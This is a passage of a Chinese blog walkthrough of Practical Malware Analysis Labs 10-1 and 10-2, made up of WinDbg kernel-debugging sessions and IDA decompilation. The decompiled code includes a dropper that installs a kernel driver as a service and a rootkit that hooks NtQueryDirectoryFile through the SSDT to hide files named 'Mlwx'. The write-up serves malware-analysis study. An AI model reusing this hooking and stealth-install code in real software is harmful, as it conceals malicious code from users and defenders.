13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>为了解决任何难以定位的服务名，可以使用!object \\Driver命令获取当前内核驱动对象列表</p></blockquote>\n<p>通过命令<code>!drvobj</code>可以获取驱动对象的地址（871df558）。因为在设备对象列表中没有设备列出，所以这个驱动没有供用户空间程序访问的设备。</p>\n<p>一旦获得驱动对象的地址，可以使用<code>dt</code>命令查看它：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>: kd&gt; dt _DRIVER_OBJECT <span class=\"number\">871</span>df558</span><br><span class=\"line\">nt!_DRIVER_OBJECT</span><br><span class=\"line\">   +<span class=\"number\">0x000</span> Type             : <span class=\"number\">0</span>n4</span><br><span class=\"line\">   +<span class=\"number\">0x002</span> Size             : <span class=\"number\">0</span>n168</span><br><span class=\"line\">   +<span class=\"number\">0x004</span> DeviceObject     : (null) </span><br><span class=\"line\">   +<span class=\"number\">0x008</span> Flags            : <span class=\"number\">0x12</span></span><br><span class=\"line\">   +<span class=\"number\">0x00c</span> DriverStart      : <span class=\"number\">0x95197000</span> Void</span><br><span class=\"line\">   +<span class=\"number\">0x010</span> DriverSize       : <span class=\"number\">0xe80</span></span><br><span class=\"line\">   +<span class=\"number\">0x014</span> DriverSection    : <span class=\"number\">0x85ed3ec0</span> Void</span><br><span class=\"line\">   +<span class=\"number\">0x018</span> DriverExtension  : <span class=\"number\">0x871df600</span> _DRIVER_EXTENSION</span><br><span class=\"line\">   +<span class=\"number\">0x01c</span> DriverName       : _UNICODE_STRING <span class=\"string\">&quot;\\Driver\\Lab10-01&quot;</span></span><br><span class=\"line\">   +<span class=\"number\">0x024</span> HardwareDatabase : <span class=\"number\">0x8418c270</span> _UNICODE_STRING <span class=\"string\">&quot;\\REGISTRY\\MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM&quot;</span></span><br><span class=\"line\">   +<span class=\"number\">0x028</span> FastIoDispatch   : (null) </span><br><span class=\"line\">   +<span class=\"number\">0x02c</span> DriverInit       : <span class=\"number\">0x95197959</span>     <span class=\"type\">long</span>  +<span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x030</span> DriverStartIo    : (null) </span><br><span class=\"line\">   +<span class=\"number\">0x034</span> DriverUnload     : <span class=\"number\">0x95197486</span>     <span class=\"type\">void</span>  +<span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x038</span> MajorFunction    : [<span class=\"number\">28</span>] <span class=\"number\">0x83ec279b</span>     <span class=\"type\">long</span>  nt!IopInvalidDeviceRequest+<span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<p>尝试确定驱动卸载时调用的函数——偏移量0x034的信息DriverUnload，然后使用入以下命令设置一个断点：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt;bp 0x95197486</span><br><span class=\"line\">或</span><br><span class=\"line\">0: kd&gt;bp 0xffffffff95197486 </span><br></pre></td></tr></table></figure>\n\n<p>设置断点后，恢复内核运行（g）。然后回到虚拟机中运行x32dbg。由于在内核调试器命中了断点，整个Guest OS会卡死。此时，回到内核调试器（Break）并且单步运行，可以看到几处call esi</p>\n<p>使用下面命令查看esi所指的函数为nt!RtlCreateRegistryKey和：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt; r esi</span><br><span class=\"line\">esi=83fa5246</span><br><span class=\"line\">0: kd&gt; u ffffffff83fa5246</span><br><span class=\"line\">nt!RtlCreateRegistryKey:</span><br><span class=\"line\">83fa5246 8bff            mov     edi,edi</span><br><span class=\"line\">83fa5248 55              push    ebp</span><br><span class=\"line\">83fa5249 8bec            mov     ebp,esp</span><br><span class=\"line\">83fa524b 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]</span><br><span class=\"line\">83fa524e 8b5508          mov     edx,dword ptr [ebp+8]</span><br><span class=\"line\">83fa5251 8d450c          lea     eax,[ebp+0Ch]</span><br><span class=\"line\">83fa5254 50              push    eax</span><br><span class=\"line\">83fa5255 6a01            push    1</span><br><span class=\"line\">0: kd&gt; r esi</span><br><span class=\"line\">esi=83fe6218</span><br><span class=\"line\">0: kd&gt; u ffffffff83fe6218</span><br><span class=\"line\">nt!RtlWriteRegistryValue:</span><br><span class=\"line\">83fe6218 8bff            mov     edi,edi</span><br><span class=\"line\">83fe621a 55              push    ebp</span><br><span class=\"line\">83fe621b 8bec            mov     ebp,esp</span><br><span class=\"line\">83fe621d 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]</span><br><span class=\"line\">83fe6220 8b5508          mov     edx,dword ptr [ebp+8]</span><br><span class=\"line\">83fe6223 83ec0c          sub     esp,0Ch</span><br><span class=\"line\">83fe6226 56              push    esi</span><br><span class=\"line\">83fe6227 8d450c          lea     eax,[ebp+0Ch]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>如果在0x95197486处的卸载函数DriverUnload很长或很复杂，使用windbg较难分析它。多数情况下，一旦确定了函数的位置，可以使用ida进行分析。但windbg中的函数位置与ida中不一样，所以为了在ida中查看函数，还要进行手动计算。</p>\n<p>首先使用lm命令，计算函数从windbg加载文件开始处的偏移量，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>: kd&gt; lm</span><br><span class=\"line\">start    end        module name</span><br><span class=\"line\"><span class=\"number\">83e0</span>b000 <span class=\"number\">84233000</span>   nt         (pdb symbols)          C:\\ProgramData\\Dbg\\sym\\ntkrpamp.pdb\\<span class=\"number\">5</span>D110DC0022948A3B3FAF52F08E778402\\ntkrpamp.pdb</span><br><span class=\"line\"><span class=\"number\">950</span>ca000 <span class=\"number\">950</span>dc000   <span class=\"title function_\">BTHUSB</span>     <span class=\"params\">(deferred)</span>             </span><br><span class=\"line\">950dc000 95140000   <span class=\"title function_\">bthport</span>    <span class=\"params\">(deferred)</span>             </span><br><span class=\"line\">95140000 95164000   <span class=\"title function_\">rfcomm</span>     <span class=\"params\">(deferred)</span>             </span><br><span class=\"line\">95164000 95171000   <span class=\"title function_\">BthEnum</span>    <span class=\"params\">(deferred)</span>             </span><br><span class=\"line\">95171000 9518c000   <span class=\"title function_\">bthpan</span>     <span class=\"params\">(deferred)</span>             </span><br><span class=\"line\">9518c000 95197000   <span class=\"title function_\">monitor</span>    <span class=\"params\">(deferred)</span>             </span><br><span class=\"line\">95197000 95197e80   <span class=\"title function_\">Lab10_01</span>   <span class=\"params\">(no symbols)</span>           </span><br><span class=\"line\"></span><br><span class=\"line\">Unloaded modules:</span><br><span class=\"line\">905f3000 905fe000   monitor.sys</span><br><span class=\"line\">8ac1c000 8ac80000   bthport.sys</span><br><span class=\"line\">90400000 90412000   BTHUSB.sys</span><br><span class=\"line\">8aca4000 8acb1000   BthEnum.sys</span><br><span class=\"line\">8ac80000 8aca4000   rfcomm.sys</span><br><span class=\"line\">8acb1000 8accc000   bthpan.sys</span><br><span class=\"line\">9705b000 97073000   parport.sys</span><br><span class=\"line\">89c2d000 89c3a000   crashdmp.sys</span><br><span class=\"line\">8a019000 8a023000   dump_storport.sys</span><br><span class=\"line\">89a00000 89a18000   dump_LSI_SAS.sys</span><br><span class=\"line\">89def000 89e00000   dump_dumpfve.sys</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，文件被加载到0x95197000。从前面可知，卸载函数位于0x95197486处，从0x95197486减去0x95197000得到偏移量（0x486）。然后在ida中跳到卸载函数。例如，若ida中加载中基地址（imagebase）是0x100000，则在0x100000+0x486&#x3D;0x100486处找到卸载函数然后进行静态分析。另一种方法是，在ida中，通过edit—&gt;segment—&gt;rebase program来修改基地址，将地址0x100000修改为0x95197000。</p>\n<h1 id=\"《恶意代码分析实战》——Lab10-2\"><a href=\"#《恶意代码分析实战》——Lab10-2\" class=\"headerlink\" title=\"《恶意代码分析实战》——Lab10.2\"></a>《恶意代码分析实战》——Lab10.2</h1><h2 id=\"静态分析-Lab10-02-exe\"><a href=\"#静态分析-Lab10-02-exe\" class=\"headerlink\" title=\"静态分析-Lab10-02.exe\"></a>静态分析-Lab10-02.exe</h2><p>使用ida查看Lab10-02.exe主函数，可以看出该程序首先会获取编号为0x65（101）的资源，然后写入C:\\Windows\\System32\\Mlwx486.sys，并以此创建服务。这个文件包含了由操作系统加载的内核代码。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  HRSRC v3; // edi@1</span><br><span class=\"line\">  HGLOBAL v4; // ebx@1</span><br><span class=\"line\">  HANDLE v5; // esi@2</span><br><span class=\"line\">  DWORD v6; // eax@3</span><br><span class=\"line\">  SC_HANDLE v7; // eax@3</span><br><span class=\"line\">  SC_HANDLE v9; // eax@5</span><br><span class=\"line\">  void *v10; // esi@5</span><br><span class=\"line\">  DWORD NumberOfBytesWritten; // [sp+Ch] [bp-4h]@3</span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = FindResourceA(0, (LPCSTR)0x65, &quot;FILE&quot;);</span><br><span class=\"line\">  v4 = LoadResource(0, v3);</span><br><span class=\"line\">  if ( v3 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5 = CreateFileA(&quot;C:\\\\Windows\\\\System32\\\\Mlwx486.sys&quot;, 0xC0000000, 0, 0, 2u, 0x80u, 0);</span><br><span class=\"line\">    if ( v5 != (HANDLE)-1 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v6 = SizeofResource(0, v3);</span><br><span class=\"line\">      WriteFile(v5, v4, v6, &amp;NumberOfBytesWritten, 0);</span><br><span class=\"line\">      CloseHandle(v5);</span><br><span class=\"line\">      v7 = OpenSCManagerA(0, 0, 0xF003Fu);</span><br><span class=\"line\">      if ( !v7 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        printf(&quot;Failed to open service manager.\\n&quot;);</span><br><span class=\"line\">        return 0;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      v9 = CreateServiceA(</span><br><span class=\"line\">             v7,</span><br><span class=\"line\">             &quot;486 WS Driver&quot;,</span><br><span class=\"line\">             &quot;486 WS Driver&quot;,</span><br><span class=\"line\">             0xF01FFu,</span><br><span class=\"line\">             1u,</span><br><span class=\"line\">             3u,</span><br><span class=\"line\">             1u,</span><br><span class=\"line\">             &quot;C:\\\\Windows\\\\System32\\\\Mlwx486.sys&quot;,</span><br><span class=\"line\">             0,</span><br><span class=\"line\">             0,</span><br><span class=\"line\">             0,</span><br><span class=\"line\">             0,</span><br><span class=\"line\">             0);</span><br><span class=\"line\">      v10 = v9;</span><br><span class=\"line\">      if ( !v9 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        printf(&quot;Failed to create service.\\n&quot;);</span><br><span class=\"line\">        return 0;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      if ( !StartServiceA(v9, 0, 0) )</span><br><span class=\"line\">        printf(&quot;Failed to start service.\\n&quot;);</span><br><span class=\"line\">      CloseServiceHandle(v10);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>接下来应该查找程序创建的文件，以便分析并且确定内核代码做了什么。但是查找C:\\Windows\\System32\\Mlwx486.sys时，却没有出现，怀疑这是一个Rootkit。</p>\n<h2 id=\"查找Rootkit\"><a href=\"#查找Rootkit\" class=\"headerlink\" title=\"查找Rootkit\"></a>查找Rootkit</h2><p>为了进一步调查，要检查内核驱动是否被加载。使用cmd执行sc命令检查运行内核驱动程序的服务状态：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc query &quot;486 WS Driver&quot;</span><br></pre></td></tr></table></figure>\n\n<p>查询名为”486 WS Driver”的服务，它在Lab10-02.exe的CreateServiceA中被指定。可以看到该服务仍然在运行，这表明内核代码在内存中。奇怪的是驱动仍然在运行，但是它没有在硬盘上。使用windbg命令lm查询驱动是否被真正加载。</p>\n<p>看到了一个与Lab10-02.exe创建文件名（Mlwx486.sys）匹配的条目Mlwx486。</p>\n<p>现在确定文件名为Mlwx486.sys的驱动被载入内存，但是文件没有在硬盘上显示，这暗示它可能是一个Rootkit。</p>\n<p>接下来，检查SSDT的所有修改项       </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>: kd&gt; dd <span class=\"title function_\">dwo</span><span class=\"params\">(KeServiceDescriptorTable)</span> L100</span><br><span class=\"line\">ReadVirtual: 83e76e3c not properly sign extended</span><br><span class=\"line\">......</span><br><span class=\"line\">83e76e4c  84094933 83f125cc 84107433 8410747c</span><br><span class=\"line\">83e76e5c  84015dc8 84122cfc 84123f55 8400c557</span><br><span class=\"line\">83e76e6c  8409efd5 840f9da5 8404a210 8401911f</span><br><span class=\"line\">83e76e7c  83faeb85 840eb490 83fffacf 84042faf</span><br><span class=\"line\">83e76e8c  84090200 fffef813 8408f60d 8400d5d1</span><br><span class=\"line\">83e76e9c  840a0a71 8400fc66 840a0851 84098fd8</span><br><span class=\"line\">83e76eac  84021e2f 840e5a51 840963b9 840a0ca3</span><br><span class=\"line\">83e76ebc  840792f2 84094362 84024a88 84018753</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>可以看到第五行的fffef813明显位于ntoskrnl模块的范围外，位于加载的Mlwx486.sys的驱动内。将虚拟机恢复到Rootkit安装之前的状态，查看存储在SSDT中的哪个函数被覆盖了。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>当检查SSDT 时，应观察其函数指针是否存在NT模块的地址范围内，如果Rootkit挂钩了其中某个函数，则这个函数指针可能不在NT模块的地址范围内。</p>\n<p>可以使用命令lm m nt查看SSDT列表，若发现不在地址范围内的函数指针，则首先使用lm命令查询模块列表，确认函数指针在哪个模块，定位了驱动程序，就可以查找挂钩代码并进行分析</p></blockquote>\n<p>本例中被覆盖的是NtQueryDirectoryFile，它是一个提取文件和目录信息的通用函数，而FindFirstFile和FindNextFile都是调用它来遍历目录结构的。Windows资源管理器也会利用它来显示文件和目录</p>\n<h2 id=\"分析挂钩函数\"><a href=\"#分析挂钩函数\" class=\"headerlink\" title=\"分析挂钩函数\"></a>分析挂钩函数</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NTSTATUS __stdcall sub_10706(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  PVOID v2; // edi@1</span><br><span class=\"line\">  PVOID *v3; // eax@1</span><br><span class=\"line\">  signed int v4; // ecx@1</span><br><span class=\"line\">  UNICODE_STRING SystemRoutineName; // [sp+8h] [bp-10h]@1</span><br><span class=\"line\">  UNICODE_STRING DestinationString; // [sp+10h] [bp-8h]@1</span><br><span class=\"line\"></span><br><span class=\"line\">  RtlInitUnicodeString(&amp;DestinationString, L&quot;NtQueryDirectoryFile&quot;);</span><br><span class=\"line\">  RtlInitUnicodeString(&amp;SystemRoutineName, L&quot;KeServiceDescriptorTable&quot;);</span><br><span class=\"line\">  v2 = MmGetSystemRoutineAddress(&amp;DestinationString);</span><br><span class=\"line\">  v3 = *(PVOID **)MmGetSystemRoutineAddress(&amp;SystemRoutineName);</span><br><span class=\"line\">  v4 = 0;</span><br><span class=\"line\">  do</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    ++v3;</span><br><span class=\"line\">    if ( *v3 == v2 )</span><br><span class=\"line\">      break;</span><br><span class=\"line\">    ++v4;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  while ( v4 &lt; 284 );</span><br><span class=\"line\">  dword_1068C = (int)v2;</span><br><span class=\"line\">  dword_10690 = (int)v3;</span><br><span class=\"line\">  *v3 = sub_10486;</span><br><span class=\"line\">  return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS __stdcall sub_10486(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG FileInformationLength, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char *v11; // esi@1</span><br><span class=\"line\">  NTSTATUS v12; // eax@1</span><br><span class=\"line\">  char *v13; // edi@1</span><br><span class=\"line\">  char v14; // bl@4</span><br><span class=\"line\">  NTSTATUS RestartScana; // [sp+38h] [bp+30h]@1</span><br><span class=\"line\"></span><br><span class=\"line\">  v11 = (char *)FileInformation;</span><br><span class=\"line\">  v12 = NtQueryDirectoryFile(</span><br><span class=\"line\">          FileHandle,</span><br><span class=\"line\">          Event,</span><br><span class=\"line\">          ApcRoutine,</span><br><span class=\"line\">          ApcContext,</span><br><span class=\"line\">          IoStatusBlock,</span><br><span class=\"line\">          FileInformation,</span><br><span class=\"line\">          FileInformationLength,</span><br><span class=\"line\">          FileInformationClass,</span><br><span class=\"line\">          ReturnSingleEntry,</span><br><span class=\"line\">          FileName,</span><br><span class=\"line\">          RestartScan);</span><br><span class=\"line\">  v13 = 0;</span><br><span class=\"line\">  RestartScana = v12;</span><br><span class=\"line\">  if ( FileInformationClass == FileBothDirectoryInformation &amp;&amp; v12 &gt;= 0 &amp;&amp; !ReturnSingleEntry )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    while ( 1 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v14 = 0;</span><br><span class=\"line\">      if ( RtlCompareMemory(v11 + 0x5E, L&quot;Mlwx&quot;, 8u) == 8 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v14 = 1;</span><br><span class=\"line\">        if ( v13 )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          if ( *(_DWORD *)v11 )</span><br><span class=\"line\">            *(_DWORD *)v13 += *(_DWORD *)v11;</span><br><span class=\"line\">          else</span><br><span class=\"line\">            *(_DWORD *)v13 = 0;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      if ( !*(_DWORD *)v11 )</span><br><span class=\"line\">        break;</span><br><span class=\"line\">      if ( !v14 )</span><br><span class=\"line\">        v13 = v11;</span><br><span class=\"line\">      v11 += *(_DWORD *)v11;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return RestartScana;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>对于NtQueryDirectoryFile函数，若FileInformationClass为FileBothDirectoryInformation（3），则执行函数后，FileInformation会被填充为_FILE_BOTH_DIR_INFORMATION结构体。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00000000 _FILE_BOTH_DIR_INFORMATION struc ; (sizeof=0x60, align=0x8, copyof_14)</span><br><span class=\"line\">00000000 NextEntryOffset dd ?</span><br><span class=\"line\">00000004 FileIndex       dd ?</span><br><span class=\"line\">00000008 CreationTime    LARGE_INTEGER ?</span><br><span class=\"line\">00000010 LastAccessTime  LARGE_INTEGER ?</span><br><span class=\"line\">00000018 LastWriteTime   LARGE_INTEGER ?</span><br><span class=\"line\">00000020 ChangeTime      LARGE_INTEGER ?</span><br><span class=\"line\">00000028 EndOfFile       LARGE_INTEGER ?</span><br><span class=\"line\">00000030 AllocationSize  LARGE_INTEGER ?</span><br><span class=\"line\">00000038 FileAttributes  dd ?</span><br><span class=\"line\">0000003C FileNameLength  dd ?</span><br><span class=\"line\">00000040 EaSize          dd ?</span><br><span class=\"line\">00000044 ShortNameLength db ?</span><br><span class=\"line\">00000045                 db ? ; undefined</span><br><span class=\"line\">00000046 ShortName       dw 12 dup(?)</span><br><span class=\"line\">0000005E FileName        dw ?</span><br><span class=\"line\">00000060 _FILE_BOTH_DIR_INFORMATION 